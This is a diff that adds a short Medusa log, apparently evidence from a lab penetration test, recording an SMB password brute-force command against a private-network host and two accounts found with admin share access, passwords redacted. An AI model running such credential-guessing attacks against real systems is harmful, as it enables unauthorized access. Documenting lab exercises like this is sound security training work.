@@ -1,0 +1,5 @@
+# Medusa v.2.3 (2026-11-13 14:37:08)
+# medusa -h 192.168.56.102 -U wordlists/smb-usuarios.txt -P wordlists/smb-senhas.txt -M smbnt -m GROUP:LOCAL -m MODE:AUTO -t 1 -O evidencias/smb/medusa.txt
+2026-11-13 14:37:11 ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: [REDACTED] [SUCCESS (ADMIN$ - Access Allowed)]
+2026-11-13 14:37:13 ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: user Password: [REDACTED] [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2026-11-13 14:37:13).
